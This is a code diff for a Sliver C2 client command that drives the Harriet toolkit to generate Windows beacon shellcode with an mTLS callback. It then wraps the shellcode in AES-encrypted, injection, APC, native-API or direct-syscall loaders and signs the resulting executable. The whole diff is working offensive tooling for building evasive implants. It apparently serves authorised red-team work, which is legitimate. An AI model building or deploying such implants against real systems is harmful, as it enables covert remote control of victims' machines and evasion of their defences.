@@ -39,6 +39,7 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 	listener, _ := cmd.Flags().GetString("listener")
 	arch, _ := cmd.Flags().GetString("arch")
 	skipSign, _ := cmd.Flags().GetBool("no-sign")
+	shellcodeFile, _ := cmd.Flags().GetString("shellcode")
 
 	if harrietPath == "" {
 		harrietPath = defaultHarrietPath
@@ -48,20 +49,38 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 	if _, err := os.Stat(harrietPath); os.IsNotExist(err) {
 		con.PrintErrorf("Harriet not found at %s\n", harrietPath)
 		con.PrintInfof("Clone it: git clone https://github.com/assume-breach/Home-Grown-Red-Team.git\n")
-		con.PrintInfof("Then: harriet generate --harriet-path /path/to/Harriet\n")
+		con.PrintInfof("Then: harriet --harriet-path /path/to/Harriet\n")
 		return
 	}
 
-	// Step 1: Generate Sliver shellcode
-	con.PrintInfof("Generating Sliver shellcode...\n")
-	shellcodePath, err := generateSliverShellcode(con, listener, arch, format)
-	if err != nil {
-		con.PrintErrorf("Failed to generate shellcode: %s\n", err)
-		return
-	}
-	defer os.Remove(shellcodePath)
+	var shellcodePath string
+	var cleanupShellcode bool
 
-	con.PrintInfof("Shellcode generated: %s\n", shellcodePath)
+	if shellcodeFile != "" {
+		// Use pre-generated shellcode file
+		if _, err := os.Stat(shellcodeFile); os.IsNotExist(err) {
+			con.PrintErrorf("Shellcode file not found: %s\n", shellcodeFile)
+			return
+		}
+		shellcodePath = shellcodeFile
+		con.PrintInfof("Using shellcode file: %s\n", shellcodeFile)
+	} else {
+		// Generate Sliver shellcode via RPC
+		con.PrintInfof("Generating Sliver shellcode...\n")
+		var err error
+		shellcodePath, err = generateSliverShellcode(con, listener, arch, format)
+		if err != nil {
+			con.PrintErrorf("Failed to generate shellcode: %s\n", err)
+			con.PrintInfof("Tip: generate manually with 'generate --format shellcode' then use --shellcode <file>\n")
+			return
+		}
+		cleanupShellcode = true
+	}
+	if cleanupShellcode {
+		defer os.Remove(shellcodePath)
+	}
+
+	con.PrintInfof("Shellcode: %s\n", shellcodePath)
 
 	// Step 2: Set up Harriet build environment
 	con.PrintInfof("Building Harriet payload (method: %s)...\n", method)
@@ -81,7 +100,7 @@ func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []st
 	con.PrintInfof("Method: %s | Format: %s | Signed: %v\n", method, format, !skipSign)
 }
 
-// generateSliverShellcode - Use Sliver's generate API to create raw shellcode
+// generateSliverShellcode - Use Sliver's Generate API to create shellcode
 func generateSliverShellcode(con *console.SliverClient, listener string, arch string, format string) (string, error) {
 	// Create temp file for shellcode
 	tmpFile, err := os.CreateTemp("", "sliver-sc-*.bin")
@@ -90,53 +109,48 @@ func generateSliverShellcode(con *console.SliverClient, listener string, arch st
 	}
 	tmpFile.Close()
 
-	// Map arch string to protobuf value
-	archStr := "amd64"
+	goarch := "amd64"
 	if arch == "x86" || arch == "386" {
-		archStr = "386"
+		goarch = "386"
 	}
 
-	// Use generate stager or shellcode command
-	// This calls the Sliver server's generate endpoint
-	config := &clientpb.ImplantConfig{
-		IsShellcode: true,
-		Format:      clientpb.OutputFormat_SHELLCODE,
-	}
-	if archStr == "amd64" {
-		config.GOARCH = "amd64"
-	} else {
-		config.GOARCH = "386"
-	}
-
-	// For now, use the msf stager generation which is more reliable for shellcode
-	stagerReq := &clientpb.MsfStagerReq{
-		Arch:     archStr,
-		Format:   "raw",
-		Host:     "",
-		Port:     0,
-		Protocol: clientpb.StageProtocol_TCP,
-		BadChars: []string{},
-	}
-
-	// Try to parse listener as host:port
+	// Parse listener (host:port) for C2 config
+	c2Host := ""
+	c2Port := ""
 	if listener != "" {
 		parts := strings.SplitN(listener, ":", 2)
+		c2Host = parts[0]
 		if len(parts) == 2 {
-			stagerReq.Host = parts[0]
-			fmt.Sscanf(parts[1], "%d", &stagerReq.Port)
+			c2Port = parts[1]
 		}
 	}
+	if c2Host == "" {
+		return "", fmt.Errorf("--listener host:port is required for shellcode generation (e.g. --listener 10.0.0.1:8888)")
+	}
 
-	stager, err := con.Rpc.MsfStage(context.Background(), stagerReq)
+	c2URL := fmt.Sprintf("mtls://%s:%s", c2Host, c2Port)
+
+	config := &clientpb.ImplantConfig{
+		GOOS:        "windows",
+		GOARCH:      goarch,
+		Format:      clientpb.OutputFormat_SHELLCODE,
+		IsShellcode: true,
+		IsBeacon:    true,
+		C2: []*clientpb.ImplantC2{
+			{URL: c2URL, Priority: 0},
+		},
+		BeaconInterval: 60,
+		BeaconJitter:   30,
+	}
+
+	generate, err := con.Rpc.Generate(context.Background(), &clientpb.GenerateReq{
+		Config: config,
+	})
 	if err != nil {
-		return "", fmt.Errorf("stager generation failed: %s", err)
+		return "", fmt.Errorf("generate failed: %s\nTip: use --shellcode <file> with pre-generated shellcode instead", err)
 	}
 
-	if stager.GetResponse() != nil && stager.GetResponse().GetErr() != "" {
-		return "", fmt.Errorf("stager error: %s", stager.GetResponse().GetErr())
-	}
-
-	shellcode := stager.GetFile().GetData()
+	shellcode := generate.GetFile().GetData()
 	if len(shellcode) == 0 {
 		return "", fmt.Errorf("empty shellcode generated")
 	}
@@ -145,26 +159,29 @@ func generateSliverShellcode(con *console.SliverClient, listener string, arch st
 		return "", fmt.Errorf("failed to write shellcode: %s", err)
 	}
 
+	con.PrintInfof("Generated %d byte shellcode (beacon via %s)\n", len(shellcode), c2URL)
 	return tmpFile.Name(), nil
 }
 
 // buildHarrietPayload - Run Harriet's build process on the shellcode
 func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcodePath string, output string, method string, format string, skipSign bool) (string, error) {
 	// Determine which Harriet module to use
+	// harrietPath points to the Harriet root (e.g. /opt/Home-Grown-Red-Team/Harriet)
+	// Modules are directly under it: FULLAes/, FULLInj/, etc.
 	modulePath := ""
 	switch method {
 	case "aes":
-		modulePath = filepath.Join(harrietPath, "Harriet", "FULLAes")
+		modulePath = filepath.Join(harrietPath, "FULLAes")
 	case "inject":
-		modulePath = filepath.Join(harrietPath, "Harriet", "FULLInj")
+		modulePath = filepath.Join(harrietPath, "FULLInj")
 	case "queueapc":
-		modulePath = filepath.Join(harrietPath, "Harriet", "QueueUserAPC")
+		modulePath = filepath.Join(harrietPath, "QueueUserAPC")
 	case "nativeapi":
-		modulePath = filepath.Join(harrietPath, "Harriet", "NativeAPI")
+		modulePath = filepath.Join(harrietPath, "NativeAPI")
 	case "directsyscall":
-		modulePath = filepath.Join(harrietPath, "Harriet", "DirectSyscalls")
+		modulePath = filepath.Join(harrietPath, "DirectSyscalls")
 	default:
-		modulePath = filepath.Join(harrietPath, "Harriet", "FULLAes")
+		modulePath = filepath.Join(harrietPath, "FULLAes")
 	}
 
 	if _, err := os.Stat(modulePath); os.IsNotExist(err) {
@@ -196,8 +213,8 @@ func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcod
 	// Run AES encryption on shellcode
 	aesScript := filepath.Join(modulePath, "Resources", "aesencrypt.py")
 	if _, err := os.Stat(aesScript); os.IsNotExist(err) {
-		// Fallback: find it in the parent
-		aesScript = filepath.Join(harrietPath, "Harriet", "FULLAes", "Resources", "aesencrypt.py")
+		// Fallback: look in FULLAes module (all modules share the same encrypt script)
+		aesScript = filepath.Join(harrietPath, "FULLAes", "Resources", "aesencrypt.py")
 	}
 
 	con.PrintInfof("Encrypting shellcode with AES...\n")
@@ -304,7 +321,7 @@ func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcod
 	}
 
 	// Check for resource file
-	resFile := filepath.Join(harrietPath, "Harriet", "Resources", "resources.res")
+	resFile := filepath.Join(harrietPath, "Resources", "resources.res")
 	if _, err := os.Stat(resFile); err == nil {
 		compileArgs = append(compileArgs, resFile)
 	}
@@ -317,8 +334,8 @@ func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcod
 
 	// Sign the binary
 	if !skipSign {
-		certPath := filepath.Join(harrietPath, "Harriet", "Resources", "certificate.pem")
-		keyPath := filepath.Join(harrietPath, "Harriet", "Resources", "private_key.pem")
+		certPath := filepath.Join(harrietPath, "Resources", "certificate.pem")
+		keyPath := filepath.Join(harrietPath, "Resources", "private_key.pem")
 
 		if _, err := os.Stat(certPath); err == nil {
 			signedPath := outputPath + ".signed"
